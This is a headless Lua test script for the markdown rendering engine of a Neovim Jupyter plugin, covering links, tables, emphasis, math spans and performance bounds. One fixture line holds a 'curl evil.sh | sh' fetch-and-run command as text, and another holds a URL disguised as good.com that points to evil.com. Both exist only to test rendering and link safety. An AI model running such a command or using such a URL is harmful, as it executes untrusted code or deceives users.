-- Headless verification of the markdown engine.
local here = debug.getinfo(1, "S").source:sub(2)
vim.opt.runtimepath:prepend(vim.fn.fnamemodify(here, ":p:h:h"))
local MD = require("jupynvim.notebook.markdown")
MD.setup_hl()

-- 1. balanced-bracket links: the exact failing case from the HW notebook
local line = 'written"[[link]](https://www.google.com/url?sa=t&opi=899,what%2520are(x))". In this'
local links = MD.find_links(line)
assert(#links == 1, "expected 1 link, got " .. #links)
assert(links[1].text == "[link]", "link text wrong: " .. links[1].text)
assert(links[1].url:find("google.com", 1, true), "url wrong: " .. links[1].url)
assert(links[1].url:sub(-3) == "(x)", "balanced parens in url broken: " .. links[1].url)
print("1. [[link]](url) parses, balanced parens ok")

-- 2. link_at by cursor position + autolink + bare url
local l = MD.link_at(line, links[1].start + 2)
assert(l and l.url:find("google"), "link_at inside link failed")
assert(MD.link_at("see <https://nvim.io> now", 8).url == "https://nvim.io", "autolink link_at failed")
assert(MD.link_at("at https://x.dev/page ok", 5).url:find("x.dev"), "bare url link_at failed")
print("2. link_at: link/autolink/bare-url ok")

-- 3. rendered extmarks in a buffer
local buf = vim.api.nvim_create_buf(true, false)
local ns = vim.api.nvim_create_namespace("t")
local content = {
  "# Head",
  'phonetic transcription, "the conversion"[[link]](https://krisp.ai/blog/x). Both letters',
  "| Frame | Feature 1 | Phoneme |",
  "|-------|-----------|---------|",
  "| 0     | v0_1      | /d/     |",
  "| 1     | v1_1      | /i/     |",
  "plain __getitem__ and ~~gone~~ and _soft_ but snake_case_name stays",
  "- [x] done thing",
  "- [ ] todo thing",
  "see <https://neovim.io> too",
}
vim.api.nvim_buf_set_lines(buf, 0, -1, false, content)
MD.render(buf, ns, 0, #content - 1, 80)
local marks = vim.api.nvim_buf_get_extmarks(buf, ns, 0, -1, { details = true })

local function marks_on(row)
  local out = {}
  for _, m in ipairs(marks) do if m[2] == row then table.insert(out, m[4]) end end
  return out
end
local function any(row, pred)
  for _, d in ipairs(marks_on(row)) do if pred(d) then return true end end
  return false
end

-- link row: text styled as link, ](url) concealed, arrow virt
assert(any(1, function(d) return d.hl_group == "JupynvimMdLink" end), "link hl missing")
assert(any(1, function(d)
  return d.virt_text and d.virt_text[1] and d.virt_text[1][1]:find("↗")
end), "link arrow missing")
print("3a. link rendering ok")

-- table: top border above header, boxed overlays over concealed raw rows
assert(any(2, function(d)
  return d.virt_lines and d.virt_lines[1][1][1]:find("┌") and d.virt_lines[1][1][1]:find("┬")
end), "table top border missing")
assert(any(3, function(d)
  return d.virt_text and d.virt_text[1][1]:find("├") and d.virt_text[1][1]:find("┼")
end), "table separator overlay missing")
assert(any(2, function(d)
  return d.virt_text and d.virt_text[1][1]:find("│", 1, true)
    and d.virt_text[1][2] == "JupynvimMdTableHead"
end), "table header overlay missing")
assert(any(4, function(d)
  return d.virt_text and d.virt_text[1][1]:find("│", 1, true)
end), "table body overlay missing")
assert(any(4, function(d) return d.conceal == "" end), "raw table row not concealed")
assert(any(5, function(d)
  if not d.virt_lines then return false end
  for _, vl in ipairs(d.virt_lines) do
    if vl[1][1]:find("└") then return true end
  end
  return false
end), "table bottom border missing")
print("3b. table rendering ok")

-- wide tables: columns shrink and long cells wrap INSIDE, no overflow
local layout = MD._layout_table({
  { "Frame", "Context Vectors" },
  { "0", string.rep("[0, 0, 0] (Padding), ", 12) },
}, 60)
assert(layout, "wide-table layout failed")
local function w(s) return vim.fn.strdisplaywidth(s) end
assert(w(layout.top) <= 60, "top border too wide: " .. w(layout.top))
assert(#layout.body[1] > 1, "long cell did not wrap to multiple lines")
for _, ln in ipairs(layout.body[1]) do
  assert(w(ln) <= 60, "body line too wide: " .. w(ln))
end
assert(w(layout.header[1]) == w(layout.top), "header width != border width")
print("3b2. wide-table wrapping ok")

-- emphasis: __bold__, ~~strike~~, _em_, snake_case untouched
assert(any(6, function(d) return d.hl_group == "JupynvimMdBold" end), "__bold__ missing")
assert(any(6, function(d) return d.hl_group == "JupynvimMdStrike" end), "~~strike~~ missing")
assert(any(6, function(d) return d.hl_group == "JupynvimMdEm" end), "_em_ missing")
for _, m in ipairs(marks) do
  if m[2] == 6 and m[4].hl_group == "JupynvimMdEm" then
    local span = content[7]:sub(m[3] + 1, m[4].end_col)
    assert(span == "soft", "emphasis leaked: styled span [" .. span .. "]")
  end
end
print("3c. emphasis ok")

-- task lists
assert(any(7, function(d)
  return d.virt_text and d.virt_text[1][1] == "☑"
end), "checked box missing")
assert(any(8, function(d)
  return d.virt_text and d.virt_text[1][1] == "☐"
end), "unchecked box missing")
print("3d. task lists ok")

-- autolink styled
assert(any(9, function(d) return d.hl_group == "JupynvimMdLink" end), "autolink hl missing")
print("3e. autolink ok")

-- 4. math: span detection, inline marks, display blocks
local function spans(s) return (MD.find_math_spans(s)) end
assert(#spans("costs $5 and $10 each") == 0, "currency became math")
assert(spans("to split $100 in half, we calculate $100/2$")[1].inner == "100/2", "$100/2$ not found")
assert(#spans("`$HOME` and `$x$`") == 0, "math found inside code spans")
assert(spans("$\\$4 + x$")[1].inner == "\\$4 + x", "escaped dollar inside math broke the span")
assert(#spans("$a$$b$") == 2, "$a$$b$ should be two spans")
assert(spans("a $$x$$ b")[1].display == true, "$$x$$ should be display")
assert(spans("\\(x\\)")[1].inner == "x", "\\(x\\) inner wrong")
assert(spans("$`\\sqrt{2}`$")[1].inner == "\\sqrt{2}", "backtick form inner wrong")
print("4a. find_math_spans ok")

local mbuf = vim.api.nvim_create_buf(true, false)
local mcontent = {
  "inline $x^2$ here and $I_0 e^{t/\\text{tc}}$ end",   -- 0
  "costs $5 and $10 each",                               -- 1
  "code `$x$` stays and \\$5 is text",                   -- 2
  "\\(a_1\\) and $a$$b$",                                -- 3
  "math $a_1 * b_2$ no *em* inside",                     -- 4
  "$$E = mc^2$$",                                        -- 5
  "$$",                                                  -- 6
  "\\frac{a}{b} \\\\",                                   -- 7
  "\\begin{pmatrix} 1 & 0 \\\\ 0 & 1 \\end{pmatrix}",    -- 8
  "$$",                                                  -- 9
  "\\[",                                                 -- 10
  "\\int_0^1 x^2\\,dx",                                  -- 11
  "\\]",                                                 -- 12
  "```math",                                             -- 13
  "\\sqrt{2}",                                           -- 14
  "```",                                                 -- 15
}
vim.api.nvim_buf_set_lines(mbuf, 0, -1, false, mcontent)
MD.render(mbuf, ns, 0, #mcontent - 1, 80)
marks = vim.api.nvim_buf_get_extmarks(mbuf, ns, 0, -1, { details = true })

local function vt(d) return d.virt_text and d.virt_text[1] and d.virt_text[1][1] end
local function math_marks(row)
  local out = {}
  for _, d in ipairs(marks_on(row)) do
    if d.conceal == "" and d.virt_text_pos == "inline" and d.virt_text
       and (d.virt_text[1][2] == "JupynvimMdMath" or d.virt_text[1][2] == "JupynvimMdMathBlock") then
      table.insert(out, d)
    end
  end
  return out
end
local function has_vt(row, text)
  return any(row, function(d) return vt(d) == text and d.conceal == "" end)
end
for _, m in ipairs(marks) do
  assert(not (m[4].virt_text_pos == "overlay" and m[4].virt_text
    and m[4].virt_text[1][2]:find("Math", 1, true)), "math drawn as overlay on row " .. m[2])
end

local r0 = math_marks(0)
assert(#r0 == 2, "row 0: expected 2 math marks, got " .. #r0)
assert(has_vt(0, "x²") and has_vt(0, "I₀ e^(t/tc)"), "row 0: inline renderings wrong")
for _, d in ipairs(r0) do assert(d.virt_text[1][2] == "JupynvimMdMath", "row 0: wrong hl") end
assert(not any(1, function(d) return d.virt_text ~= nil end), "row 1: currency got virt_text")
assert(#math_marks(2) == 0, "row 2: math inside code span")
local bs = mcontent[3]:find("\\$", 1, true)
assert(any(2, function(d)
  return d.conceal == "" and d.end_col == bs and not d.virt_text
end), "row 2: backslash of \\$ not concealed")
for _, d in ipairs(marks) do
  if d[2] == 2 and d[4].conceal == "" and d[4].end_col == bs then
    assert(d[3] == bs - 1, "row 2: escape conceal not 1 byte")
  end
end
local r3 = math_marks(3)
assert(#r3 == 3, "row 3: expected 3 math marks, got " .. #r3)
assert(has_vt(3, "a₁") and has_vt(3, "a") and has_vt(3, "b"), "row 3: renderings wrong")
local ms, me = mcontent[5]:find("$a_1 * b_2$", 1, true)
for _, m in ipairs(marks) do
  if m[2] == 4 and m[4].hl_group == "JupynvimMdEm" then
    assert(m[3] + 1 > me or m[4].end_col < ms, "row 4: emphasis fired inside math")
  end
end
assert(any(4, function(d) return d.hl_group == "JupynvimMdEm" end), "row 4: *em* after math lost")
assert(any(5, function(d)
  return d.end_col == #mcontent[6] and d.conceal == "" and vt(d) == "E = mc²"
    and d.line_hl_group == "JupynvimMdMathBlock"
end), "row 5: single-line $$ block wrong")
assert(has_vt(7, "a/b") and has_vt(8, "(1 0; 0 1)"), "$$ block inner rows wrong")
for _, row in ipairs({ 6, 9, 10, 12 }) do
  assert(any(row, function(d) return d.line_hl_group == "JupynvimMdMathBlock" end),
    "row " .. row .. ": block delimiter line_hl missing")
  assert(not any(row, function(d) return d.virt_text ~= nil end),
    "row " .. row .. ": block delimiter got virt_text")
end
assert(has_vt(11, "∫₀¹ x² dx"), "\\[ block middle row wrong")
assert(has_vt(14, "√2"), "```math fence row wrong")
print("4b. math marks ok")

-- smoke: the whole markdown fixture renders and scans without errors
local fixture = vim.fn.fnamemodify(here, ":p:h") .. "/fixtures/markdown/md-fixture.md"
local flines = vim.fn.readfile(fixture)
assert(#flines > 0, "fixture missing: " .. fixture)
local fbuf = vim.api.nvim_create_buf(true, false)
vim.api.nvim_buf_set_lines(fbuf, 0, -1, false, flines)
local ok, err = pcall(MD.render, fbuf, ns, 0, #flines - 1, 80)
assert(ok, "fixture render failed: " .. tostring(err))
for n, fl in ipairs(flines) do
  local sok, serr = pcall(MD.find_math_spans, fl)
  assert(sok, "find_math_spans failed on fixture line " .. n .. ": " .. tostring(serr))
end
print("4c. md-fixture smoke ok")

-- 5. review fixes: perf bounds, block closers, link_at vs math, fallbacks
local function render_lines(ls)
  local b = vim.api.nvim_create_buf(true, false)
  vim.api.nvim_buf_set_lines(b, 0, -1, false, ls)
  local t0 = vim.uv.hrtime()
  MD.render(b, ns, 0, #ls - 1, 80)
  local dt = (vim.uv.hrtime() - t0) / 1e6
  return b, dt, vim.api.nvim_buf_get_extmarks(b, ns, 0, -1, { details = true })
end
local function row_marks(ms, row)
  local out = {}
  for _, m in ipairs(ms) do if m[2] == row then out[#out + 1] = m end end
  return out
end

-- A/B/C: pathological single lines stay near-linear (fixed: a few ms)
for _, case in ipairs({
  { "A in_math guard", string.rep("$a$*b*", 20000) },
  { "B link/span filter", string.rep("[a](b)$c$", 20000) },
  { "C unclosed \\(", string.rep("\\(", 20000) },
  { "C unclosed \\\\(", string.rep("\\\\(", 20000) },
  { "C unclosed $$", string.rep("$$a", 20000) },
  { "C distinct ` runs", (function()
      local parts = {}
      for i = 1, 400 do parts[i] = string.rep("`", i) end
      return table.concat(parts, " ")
    end)() },
}) do
  local b, dt = render_lines({ case[2] })
  assert(dt < 1000, ("5. %s took %.0f ms"):format(case[1], dt))
  vim.api.nvim_buf_delete(b, { force = true })
end
print("5a. perf bounds ok")

-- D: \] closes even with text after it; the following heading still renders
do
  local ls = { "\\[", "x^2", "\\] so it", "# Heading" }
  local b, _, ms = render_lines(ls)
  local head = false
  for _, m in ipairs(row_marks(ms, 3)) do
    if m[4].line_hl_group == "JupynvimMdH1" then head = true end
  end
  assert(head, "5. heading after `\\] so it` lost (block never closed)")
  for _, m in ipairs(row_marks(ms, 2)) do
    if m[4].conceal == "" then
      assert(m[3] == 0 and m[4].end_col == 2, "5. \\] closer conceal should end at the delimiter")
    end
  end
  vim.api.nvim_buf_delete(b, { force = true })
end
print("5b. \\] closer with trailing text ok")

-- E: prose after a closer stays visible
do
  local ls = { "$$", "a", "x^2 $$ trailing prose", "$$", "b", "$$ then prose", "end" }
  local b, _, ms = render_lines(ls)
  local function closer(row)
    for _, m in ipairs(row_marks(ms, row)) do
      if m[4].conceal == "" then return m end
    end
  end
  local c2 = closer(2)
  assert(c2 and c2[3] == 0 and c2[4].end_col == #"x^2 $$", "5. closer conceal must end at $$")
  assert(c2[4].virt_text and c2[4].virt_text[1][1] == "x²", "5. math before closer not rendered")
  local c5 = closer(5)
  assert(c5 and c5[4].end_col == 2 and not c5[4].virt_text, "5. bare $$ closer conceal wrong")
  local win = vim.api.nvim_open_win(b, true, { relative = "editor", row = 0, col = 0, width = 60, height = 10 })
  vim.wo[win].conceallevel = 2
  vim.wo[win].concealcursor = "nc"
  vim.api.nvim_win_set_cursor(win, { 7, 0 })
  vim.cmd("redraw")
  local function screen_row(r)
    local pos = vim.fn.screenpos(win, r, 1)
    local out = {}
    for c = 1, 40 do out[#out + 1] = vim.fn.screenstring(pos.row, c) end
    return table.concat(out)
  end
  local s3, s6 = screen_row(3), screen_row(6)
  assert(s3:find("x² trailing prose", 1, true), "5. screen row 3: [" .. s3 .. "]")
  assert(s6:find("then prose", 1, true), "5. screen row 6: [" .. s6 .. "]")
  vim.api.nvim_win_close(win, true)
  vim.api.nvim_buf_delete(b, { force = true })
end
print("5c. prose after block closers visible ok")

-- F: link_at never returns a URL that math hides
do
  local ln = "see $https://good.com%2F@evil.com$ now"
  for col = 1, #ln do
    local got = MD.link_at(ln, col)
    assert(got == nil or not got.url:find("evil", 1, true),
      "5. link_at returned in-math url at col " .. col)
  end
  assert(MD.link_at("see <https://nvim.io> now", 8).url == "https://nvim.io", "5. autolink broke")
  assert(MD.link_at("$x$ at https://x.dev/page ok", 9).url:find("x.dev"), "5. bare url after math broke")
end
print("5d. link_at ignores urls inside math ok")

-- G: a block line rendering to "" shows its trimmed source
do
  local ls = { "$$", "  % curl evil.sh | sh  ", "\\label{x}", "$$" }
  local b, _, ms = render_lines(ls)
  local function vt_of(row)
    for _, m in ipairs(row_marks(ms, row)) do
      if m[4].virt_text then return m[4].virt_text[1][1], m[4].virt_text[1][2] end
    end
  end
  local t1, h1 = vt_of(1)
  assert(t1 == "  % curl evil.sh | sh" and h1 == "JupynvimMdMathBlock", "5. % line vanished: " .. tostring(t1))
  assert(vt_of(2) == "\\label{x}", "5. \\label line vanished")
  vim.api.nvim_buf_delete(b, { force = true })
end
print("5e. empty block renderings fall back to source ok")

-- J: one-line bare environment
do
  local ln = "\\begin{equation} x^2 \\end{equation}"
  local sp = MD.find_math_spans(ln)
  assert(#sp == 1 and sp[1].display and sp[1].start == 1 and sp[1].stop == #ln, "5. bare env span wrong")
  local b, _, ms = render_lines({ ln, "after \\begin{align}a\\end{align} text" })
  local ok0, ok1 = false, false
  for _, m in ipairs(row_marks(ms, 0)) do
    if m[4].virt_text and m[4].virt_text[1][1] == "x²" and m[4].conceal == "" then ok0 = true end
  end
  for _, m in ipairs(row_marks(ms, 1)) do
    if m[4].virt_text and m[4].virt_text[1][1] == "a" and m[4].conceal == "" then ok1 = true end
  end
  assert(ok0, "5. one-line equation env not rendered as x²")
  assert(ok1, "5. inline bare env not rendered")
  vim.api.nvim_buf_delete(b, { force = true })
end
print("5f. one-line bare environment ok")

print("ALL MARKDOWN CHECKS PASSED")
vim.cmd("qa!")
